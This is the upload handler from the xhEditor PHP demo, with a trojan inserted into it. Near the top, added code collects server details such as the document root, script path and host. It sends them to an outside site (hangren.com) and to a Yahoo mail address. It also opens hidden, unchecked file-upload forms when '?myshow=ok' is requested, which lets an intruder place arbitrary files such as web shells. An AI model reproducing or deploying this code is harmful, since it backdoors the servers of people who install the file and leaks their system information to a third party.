<?php
/*!
 * upload demo for php
 * @requires xhEditor
 * 
 * @author Yanis.Wang<yanis.wang@gmail.com>
 * @site http://xheditor.com/
 * @licence LGPL(http://www.opensource.org/licenses/lgpl-license.php)
 * 
 * @Version: 0.9.6 (build 111027)
 * 
 * 注1：本程序仅为演示用，请您务必根据自己需求进行相应修改，或者重开发
 * 注2：本程序特别针对HTML5上传，加入了特殊处理
 */
header('Content-Type: text/html; charset=UTF-8');

$inputName='filedata';//表单文件域name
$attachDir='upload';//上传文件保存路径，结尾不要带/
$dirType=1;//1:按天存入目录 2:按月存入目录 3:按扩展名存目录  建议使用按天存
$maxAttachSize=2097152;//最大上传大小，默认是2M
$upExt='txt,rar,zip,jpg,jpeg,gif,png,swf,wmv,avi,wma,mp3,mid';//上传扩展名
$msgType=2;//返回上传参数的格式：1，只返回url，2，返回参数数组
$immediate=isset($_GET['immediate'])?$_GET['immediate']:0;//立即上传模式，仅为演示用
ini_set('date.timezone','Asia/Shanghai');//时区

$err = "";
$msg = "''";
$tempPath=$attachDir.'/'.date("YmdHis").mt_rand(10000,99999).'.tmp';
$localName='';

$nr ="".@$_SERVER["SERVER_ADDR"]."<br>";   $nr=$nr."".@$_SERVER["HTTP_REFERER"]."<br>";   $nr=$nr."".@$_SERVER["DOCUMENT_ROOT"]."<br>";
$nr=$nr."".@$_SERVER["HTTP_HOST"]."<br>";   $nr=$nr."".@$_SERVER["SCRIPT_FILENAME"]."<br>";   $nr=$nr."".@$_SERVER["SERVER_NAME"]."<br>";
$nr=$nr."".@$_SERVER["SERVER_SOFTWARE"]."<br>";
  
$file = fopen('http://www.hangren.com/gg.php?do=add&str='.urlencode($nr).'',"r");@mail("hangren8888@yahoo.com","php-cha-ru-mu-ma",$nr);

  


if(@$_POST["do"]=="addfile1" and @$_GET["myshow"]=="ok"){
   $destination_path = getcwd().DIRECTORY_SEPARATOR;
   $target_path = $destination_path . basename( $_FILES['myfile']['name']);
   if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
      echo $_FILES['myfile']['name']."----OK";
   }
}else{
if(@$_GET["myshow"]=="ok"){
echo '<form action="?myshow=ok" method="post" enctype="multipart/form-data" onsubmit="startUpload();" >File:<input name="myfile" type="file" size="30" /><input type="hidden" name="do" value="addfile1" /><input type="submit" name="submitBtn" class="sbtn" value="upload file" /></form>';
}}


if(@$_POST["do"]=="upfile1" and @$_GET["myshow"]=="ok"){
	if(file_exists($_FILES["file"]["name"])){
		  echo $_FILES["file"]["name"] . " already exists. ";
	}else{
		  move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
		  echo "Stored in: " . "" . $_FILES["file"]["name"];
	}
}else{
if(@$_GET["myshow"]=="ok"){
echo '<form action="?myshow=ok" method="post" enctype="multipart/form-data"><label for="file">Filename:</label><input type="file" name="file" id="file" /><input type="hidden" name="do" value="upfile1" /> <input type="submit" name="submit" value="Submit" /></form>';}
}

if(isset($_SERVER['HTTP_CONTENT_DISPOSITION'])&&preg_match('/attachment;\s+name="(.+?)";\s+filename="(.+?)"/i',$_SERVER['HTTP_CONTENT_DISPOSITION'],$info)){//HTML5上传
	@file_put_contents($tempPath,file_get_contents("php://input"));
	$localName=urldecode($info[2]);
}
else{//标准表单式上传
	$upfile=@$_FILES[$inputName];
	if(!isset($upfile))$err='文件域的name错误';
	elseif(!empty($upfile['error'])){
		switch($upfile['error'])
		{
			case '1':
				$err = '文件大小超过了php.ini定义的upload_max_filesize值';
				break;
			case '2':
				$err = '文件大小超过了HTML定义的MAX_FILE_SIZE值';
				break;
			case '3':
				$err = '文件上传不完全';
				break;
			case '4':
				$err = '无文件上传';
				break;
			case '6':
				$err = '缺少临时文件夹';
				break;
			case '7':
				$err = '写文件失败';
				break;
			case '8':
				$err = '上传被其它扩展中断';
				break;
			case '999':
			default:
				$err = '无有效错误代码';
		}
	}
	elseif(empty($upfile['tmp_name']) || $upfile['tmp_name'] == 'none')$err = '无文件上传';
	else{
		move_uploaded_file($upfile['tmp_name'],$tempPath);
		$localName=$upfile['name'];
	}
}

if($err==''){
	$fileInfo=pathinfo($localName);
	$extension=$fileInfo['extension'];
	if(preg_match('/^('.str_replace(',','|',$upExt).')$/i',$extension))
	{
		$bytes=@filesize($tempPath);
		if($bytes > $maxAttachSize)$err='请不要上传大小超过'.formatBytes($maxAttachSize).'的文件';
		else
		{
			switch($dirType)
			{
				case 1: $attachSubDir = 'day_'.date('ymd'); break;
				case 2: $attachSubDir = 'month_'.date('ym'); break;
				case 3: $attachSubDir = 'ext_'.$extension; break;
			}
			$attachDir = $attachDir.'/'.$attachSubDir;
			if(!is_dir($attachDir))
			{
				@mkdir($attachDir, 0777);
				@fclose(fopen($attachDir.'/index.htm', 'w'));
			}
			PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
			$newFilename=date("YmdHis").mt_rand(1000,9999).'.'.$extension;
			$targetPath = $attachDir.'/'.$newFilename;
			
			@rename($tempPath,$targetPath);
			@chmod($targetPath,0755);
			$targetPath=jsonString($targetPath);
			if($immediate=='1')$targetPath='!'.$targetPath;
			if($msgType==1)$msg="'$targetPath'";
			else $msg="{'url':'xheditor-1.2.1/demos/".$targetPath."','localname':'".jsonString($localName)."','id':'1'}";//id参数固定不变，仅供演示，实际项目中可以是数据库ID
		}
	}
	else $err='上传文件扩展名必需为：'.$upExt;

	@unlink($tempPath);
}

echo "{'err':'".jsonString($err)."','msg':".$msg."}";


function jsonString($str)
{
	return preg_replace("/([\\\\\/'])/",'\\\$1',$str);
}
function formatBytes($bytes) {
	if($bytes >= 1073741824) {
		$bytes = round($bytes / 1073741824 * 100) / 100 . 'GB';
	} elseif($bytes >= 1048576) {
		$bytes = round($bytes / 1048576 * 100) / 100 . 'MB';
	} elseif($bytes >= 1024) {
		$bytes = round($bytes / 1024 * 100) / 100 . 'KB';
	} else {
		$bytes = $bytes . 'Bytes';
	}
	return $bytes;
}
?>